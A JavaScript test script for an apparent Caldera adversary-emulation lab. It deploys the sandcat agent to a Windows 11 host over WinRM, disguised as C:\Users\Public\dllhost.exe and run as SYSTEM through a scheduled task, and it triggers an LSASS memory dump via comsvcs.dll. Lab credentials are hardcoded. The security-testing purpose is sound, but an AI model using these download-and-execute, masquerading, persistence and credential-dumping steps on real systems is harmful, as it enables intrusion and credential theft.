import { $ } from "bun"

const KALI_IP = "10.1.99.1"
const WIN11_IP = "10.1.99.24"
const KALI_SSH = "kali:kali"
const WINRM_AUTH = "localuser:password"
const CALDERA_URL = "http://10.1.99.1:8888"
const CALDERA_KEY = "ADMIN123"

// ─── Existing Building Blocks ───────────────────────────────────────────────

// 1. SSH command execution — works, tested
//    Uses .nothrow().quiet() to prevent Bun from throwing on non-zero exit.
//    Stderr is captured and included in the error message for debugging.
//    Pattern from server/ludus/range.js:873 (checkCaldera)
async function sshRun(host, user, pass, command) {
  const result = await $`sshpass -p ${pass} ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 ${user}@${host} ${command}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stderr = result.stderr.toString().trim()
    throw new Error(`SSH exit ${result.exitCode}: ${stderr || "no stderr"}`)
  }
  return result.stdout.toString().trim()
}

// 2. WinRM command execution — works via pywinrm (already in pyproject.toml)
//    Backslashes are escaped (C:\ → C:\\) to avoid Python unicodeescape errors.
async function winrmRun(host, user, pass, command) {
  const py = `
import winrm
s = winrm.Session('${host}', auth=('${user}', '${pass}'), transport='ssl', server_cert_validation='ignore')
r = s.run_cmd('${command.replace(/\\/g, "\\\\").replace(/'/g, "\\'")}')
print(r.std_out.decode())
if r.std_err.decode().strip():
    print(r.std_err.decode(), end='')
exit(r.status_code)
`
  const result = await $`uv run python -c ${py}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stdout = result.stdout.toString().trim()
    const stderr = result.stderr.toString().trim()
    throw new Error(`WinRM exit ${result.exitCode}: ${stdout || stderr || "no output"}`)
  }
  return result.stdout.toString().trim()
}

async function calderaApi(method, path, body) {
  const opts = {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    signal: AbortSignal.timeout(10000),
  }
  if (body !== undefined) opts.body = JSON.stringify(body)
  const res = await fetch(`${CALDERA_URL}${path}`, opts)
  return res.json()
}

async function calderaRest(method, body) {
  const res = await fetch(`${CALDERA_URL}/api/rest`, {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(10000),
  })
  return res.json()
}

// ─── Connectivity Tests ─────────────────────────────────────────────────────

async function testSshConnectivity() {
  console.log("\n=== SSH Connectivity (kali) ===")
  try {
    const user = await sshRun(KALI_IP, "kali", "kali", "whoami")
    console.log(`  PASS: whoami = ${user}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testWinrmConnectivity() {
  console.log("\n=== WinRM Connectivity (win11-22h2) ===")
  try {
    const output = await winrmRun(WIN11_IP, "localuser", "password", "whoami")
    console.log(`  PASS: whoami = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testCalderaConnectivity() {
  console.log("\n=== Caldera API ===")
  try {
    const agents = await calderaRest("POST", { index: "agents" })
    console.log(`  PASS: agents endpoint reachable, ${agents.length} agents found`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

// ─── Prereq Command Execution Tests ──────────────────────────────────────────

async function testSshPrereq() {
  console.log("\n=== SSH Prereq Execution ===")
  try {
    const output = await sshRun(KALI_IP, "kali", "kali", "id")
    console.log(`  PASS: "id" = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testWinrmPrereq() {
  console.log("\n=== WinRM Prereq Execution ===")
  try {
    const output = await winrmRun(WIN11_IP, "localuser", "password", "ver")
    console.log(`  PASS: "ver" = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

// ─── Sandcat Agent Deployment Test ──────────────────────────────────────────

async function testSandcatDeploy() {
  console.log("\n=== Sandcat Agent Deploy (win11) ===")
  const group = `test-${Date.now()}`
  try {
    // Kill stale dllhost processes from previous runs
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    // Kill stale caldera agents
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`  Cleaned ${agents.length} stale agents`)
    } catch {}

    // ── Step 1: Network check ──
    console.log("\n  [1] Network to Caldera")
    const netTest = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "Test-NetConnection -ComputerName 10.1.99.1 -Port 8888 -InformationLevel Quiet | ForEach-Object { if ($_) { Write-Host REACHABLE } else { Write-Host UNREACHABLE } }"')
    console.log(`  => 10.1.99.1:8888 ${netTest.trim()}`)

    // ── Step 2: Download sandcat ──
    console.log("\n  [2] Download sandcat.go → C:\\Users\\Public\\dllhost.exe")
    const dl = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`  => ${dl.trim()}`)

    // ── Step 3: File check ──
    console.log("\n  [3] File check")
    const fileCheck = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "$f=Get-Item \'C:\\Users\\Public\\dllhost.exe\' -ErrorAction Stop; Write-Host \\"EXISTS $($f.Length) bytes\\""')
    console.log(`  => ${fileCheck.trim()}`)

    // ── Step 4: Deploy sandcat via Scheduled Task (SYSTEM) ──
    console.log(`\n  [4] Deploy sandcat via Scheduled Task as SYSTEM (group=${group}), wait 20s, check alive`)
    const taskName = `CalderaSandcat-${group}`
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    } catch (err) {
      console.log(`  => task creation failed: ${err.message}`)
    }
    await new Promise(r => setTimeout(r, 20000))

    // Check if dllhost.exe is running (should be running as SYSTEM now)
    try {
      const tl = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "$p=Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' }; if ($p) { $wmi=Get-WmiObject Win32_Process -Filter \\"ProcessId=$($p.Id)\\"; $owner=$wmi.GetOwner(); Write-Host \\"RUNNING pid=$($p.Id) user=$($owner.User)\\" } else { Write-Host \\"DIED\\" }"')
      console.log(`  => process: ${tl.trim()}`)
    } catch (err) {
      console.log(`  => process check failed: ${err.message}`)
    }

    // ── Step 5: Check agents ──
    console.log("\n  [5] Caldera agents (after 20s wait):")
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      console.log(`  => ${agents.length} agents:`)
      for (const a of agents) {
        console.log(`     paw=${a.paw} group=${a.group} trusted=${a.trusted}`)
      }
      const mine = agents.find(a => a.group === group)
      if (mine) {
        console.log(`  => MY agent CHECKED IN! paw=${mine.paw} trusted=${mine.trusted}`)
      } else {
        console.log(`  => MY agent (group=${group}) NOT found`)
        console.log("\n  [5b] Waiting another 15s, checking again...")
        await new Promise(r => setTimeout(r, 15000))
        const agents2 = await calderaRest("POST", { index: "agents" })
        const mine2 = agents2.find(a => a.group === group)
        if (mine2) {
          console.log(`  => MY agent CHECKED IN on retry! paw=${mine2.paw} trusted=${mine2.trusted}`)
        } else {
          console.log(`  => MY agent (group=${group}) STILL not found`)
          console.log(`  => agents now: ${agents2.map(a => `${a.paw}(${a.group})`).join(', ')}`)
        }
      }
    } catch (err) {
      console.log(`  => agents check failed: ${err.message}`)
    }

    // ── Cleanup: Unregister scheduled task ──
    console.log(`\n  [cleanup] Unregistering scheduled task ${taskName}`)
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:\$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("  => task cleaned up")
    } catch (err) {
      console.log(`  => task cleanup failed: ${err.message}`)
    }

    return true
  } catch (err) {
    console.log(`\n  UNEXPECTED FAIL: ${err.message}`)
    return false
  }
}

// ─── Full Pipeline Integration Test ──────────────────────────────────────────

async function testFullPipeline() {
  console.log("\n=== Full Pipeline: Dump LSASS.exe Memory using comsvcs.dll ===")

  const abilityId = "35d92515122effdd73801c6ac3021da7"
  const abilityName = "Dump LSASS.exe Memory using comsvcs.dll"
  const group = `test-${Date.now()}`
  const taskName = `CalderaSandcat-${group}`

  // comsvcs.dll uses built-in Windows DLLs — no external payload, no prereqs
  // Command uses rundll32.exe + comsvcs.dll directly, no PathToAtomicsFolder replacement needed

  let agentPaw = null

  try {
    // ── Step 1: Clean slate ──
    console.log("\n  [1/4] Cleaning previous agents, processes, and tasks...")
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`    Cleaned ${agents.length} stale agents`)
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-ScheduledTask -TaskName \'CalderaSandcat-*\' -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false; Write-Host \'TASKS_CLEANED\'"')
    } catch {}
    console.log("    => clean")

    // ── Step 2: Deploy sandcat via Scheduled Task as SYSTEM ──
    console.log(`\n  [2/4] Deploying sandcat as SYSTEM (group=${group})...`)
    const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`    => download: ${dlResult.trim()}`)
    await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    console.log("    => sandcat deployed via Scheduled Task")

    // ── Step 3: Wait for agent + fetch ability ──
    console.log(`\n  [3/4] Waiting for agent (group=${group})...`)
    const agentStart = Date.now()
    while (Date.now() - agentStart < 60000) {
      const agents = await calderaRest("POST", { index: "agents" })
      const agent = agents.find(a => a.group === group)
      if (agent) {
        agentPaw = agent.paw
        console.log(`    => Agent checked in: paw=${agent.paw} trusted=${agent.trusted} platform=${agent.platform} executors=${JSON.stringify(agent.executors)} (${Math.round((Date.now() - agentStart) / 1000)}s)`)
        break
      }
      await new Promise(r => setTimeout(r, 3000))
    }
    if (!agentPaw) throw new Error("Agent did not check in within 60s")

    console.log(`\n  [3b/4] Fetching ability "${abilityName}"...`)
    const abilities = await calderaRest("POST", { index: "abilities", ability_id: abilityId })
    const ability = Array.isArray(abilities) ? abilities.find(a => a.ability_id === abilityId) : abilities
    if (!ability) throw new Error(`Ability "${abilityId}" not found in Caldera`)
    console.log(`    => platform=${ability.platform} executors=${JSON.stringify(ability.executors)}`)
    console.log(`    => command: ${ability.executors[0].command}`)

    // ── Step 4: Exploit agent with ability ──
    console.log(`\n  [4/4] Exploiting agent with ability...`)

    // No command modification needed — comsvcs.dll uses built-in Windows DLLs
    const exploitResult = await calderaApi("POST", "/plugin/access/exploit", { paw: agentPaw, ability_id: abilityId, obfuscator: "plain-text" })
    console.log(`    => /plugin/access/exploit result: ${JSON.stringify(exploitResult).slice(0, 200)}`)

    // Wait for link to appear
    console.log(`    => Waiting for link (120s timeout)...`)
    let linkFacts = []
    let linkStatus = null
    const pollStart = Date.now()
    while (Date.now() - pollStart < 120000) {
      const agents = await calderaRest("POST", { index: "agents", paw: agentPaw })
      const ag = Array.isArray(agents) ? agents[0] : agents
      const links = ag?.links || []
      const mine = links.find(l => l.ability?.ability_id === abilityId)
      if (mine) {
        console.log(`    Link found: id=${mine.id} status=${mine.status} finish=${mine.finish}`)
        if (mine.finish != null) {
          console.log(`    Command: ${mine.command}`)
          console.log(`    Output (stdout): ${mine.output?.stdout || "(none)"}`)
          console.log(`    Output (stderr): ${mine.output?.stderr || "(none)"}`)
          console.log(`    Facts: ${JSON.stringify(mine.facts)}`)
          linkStatus = mine.status
          linkFacts = mine.facts || []
          break
        }
        console.log(`    Link pending (status=${mine.status}), waiting...`)
      }
      await new Promise(r => setTimeout(r, 2000))
    }

    // ── Verify dump file ──
    console.log(`\n  [verify] Checking dump file...`)
    let dumpExists = false
    try {
      // SYSTEM's $env:TEMP is C:\Windows\Temp, so dump file is at C:\Windows\Temp\lsass-comsvcs.dmp
      const dumpCheck = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "if (Test-Path \'C:\\Windows\\Temp\\lsass-comsvcs.dmp\') { $f=Get-Item \'C:\\Windows\\Temp\\lsass-comsvcs.dmp\'; Write-Host \\"EXISTS $([math]::Round($f.Length/1024/1024,1))MB\\" } else { Write-Host \\"MISSING\\" }"')
      dumpExists = dumpCheck.includes("EXISTS")
      console.log(`    => Dump file: ${dumpCheck.trim()}`)
    } catch (err) {
      console.log(`    => Dump file check failed: ${err.message}`)
    }

    for (const f of linkFacts.slice(0, 10)) {
      console.log(`    fact: trait=${f.trait} value=${String(f.value).slice(0, 120)}`)
    }

    // comsvcs.dll via rundll32.exe produces no stdout, so the atomic_powershell parser
    // won't generate facts. Success is measured by dump file existence.
    const passed = dumpExists
    console.log(`\n  => Pipeline test: ${passed ? "PASSED" : "FAILED"} (link status=${linkStatus}, dump=${dumpExists ? "EXISTS" : "MISSING"})`)
    return passed
  } catch (err) {
    console.log(`\n  PIPELINE FAILED: ${err.message}`)
    return false
  } finally {
    // ── Cleanup: always run, best-effort ──
    console.log("\n  [cleanup] Removing agent, task, process, and dump...")
    try { if (agentPaw) await calderaRest("DELETE", { index: "agents", paw: agentPaw }); console.log("    agent deleted") } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
      console.log("    dllhost process killed")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("    scheduled task unregistered")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Remove-Item \'C:\\Windows\\Temp\\lsass-comsvcs.dmp\' -Force -ErrorAction SilentlyContinue; Write-Host \'DUMP_DELETED\'"')
      console.log("    dump file deleted")
    } catch {}
    console.log("    => cleanup complete")
  }
}

// ─── Missing Functions (all implemented in testAbility.js) ───────────────────

async function testMissingFunctions() {
  console.log("\n=== Missing Functions (all implemented in testAbility.js) ===")
  const needed = [
    "getCalderaAgents()",
    "deploySandcatWindows(ip)",
    "waitForAgent(targetHost)",
    "createAdversary(abilityId)",
    "createOperation(name, adversaryId, group)",
    "pollOperation(opId)",
    "getOperationReport(opId)",
    "deleteOperation(opId)",
    "deleteAdversary(advId)",
    "normalizePrereq(script)",
    "normalizeWinPrereq(script)",
    "installKaliPrereq(ip, script)",
    "installWinPrereq(ip, script)",
    "sendStatus(ws, step, status, msg)",
  ]
  for (const fn of needed) {
    console.log(`  [x] ${fn}`)
  }
  return needed
}

// ─── Main ────────────────────────────────────────────────────────────────────

async function main() {
  console.log("testAbility — Building Block Inventory\n")

  const results = {
    sshConnectivity: await testSshConnectivity(),
    winrmConnectivity: await testWinrmConnectivity(),
    calderaConnectivity: await testCalderaConnectivity(),
    sshPrereq: await testSshPrereq(),
    winrmPrereq: await testWinrmPrereq(),
    sandcatDeploy: await testSandcatDeploy(),
    fullPipeline: await testFullPipeline(),
  }

  const missing = await testMissingFunctions()

  console.log("\n=== Summary ===")
  let pass = 0
  let fail = 0
  for (const [key, ok] of Object.entries(results)) {
    if (ok) { pass++; console.log(`  [PASS] ${key}`) }
    else { fail++; console.log(`  [FAIL] ${key}`) }
  }
  console.log(`\n  ${pass} passed, ${fail} failed, ${missing.length} pipeline functions (all built)`)
  console.log(`\n  Existing building blocks: SSH, WinRM, Caldera REST, Scheduled Task deploy, /plugin/access/exploit`)
  console.log(`  Full pipeline test: agentWait → abilityLookup → abilityExploit → cleanup`)
  console.log(`  Pipeline implemented in: server/caldera/testAbility.js`)
  console.log(`  Prereq generation in: server/caldera/generateFocusedData.js`)
  console.log(`  Caldera systemd service (root): server/kaliAnsibleStart.yml`)
  console.log(`\n  Comsvcs ability specifics:`)
  console.log(`    - Uses built-in Windows DLLs (comsvcs.dll via rundll32.exe) — no external payload`)
  console.log(`    - No kali_prereq or win_prereq — all dependencies are OS-native`)
  console.log(`    - No command modification needed — no PathToAtomicsFolder references`)
  console.log(`    - Dump file: C:\\Windows\\Temp\\lsass-comsvcs.dmp (SYSTEM's $env:TEMP)`)
}

main().catch(console.error)
